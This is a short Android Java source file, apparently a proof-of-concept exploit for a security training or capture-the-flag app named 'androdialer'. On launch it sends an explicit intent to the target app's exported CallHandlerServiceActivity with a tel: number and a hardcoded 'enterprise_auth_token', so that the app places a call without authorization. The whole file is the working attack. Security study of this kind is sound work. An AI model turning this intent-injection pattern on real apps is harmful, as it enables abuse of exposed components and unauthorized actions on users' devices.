package com.poc.androdialer;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent exploit = new Intent(Intent.ACTION_VIEW);
        exploit.setClassName(
                "com.eightksec.androdialer",
                "com.eightksec.androdialer.CallHandlerServiceActivity");
        exploit.setData(Uri.parse("tel:13371337"));
        exploit.putExtra("enterprise_auth_token", "8kd1aL3R_s3Cur3_k3Y_2023");

        startActivity(exploit);
        finish();
    }
}
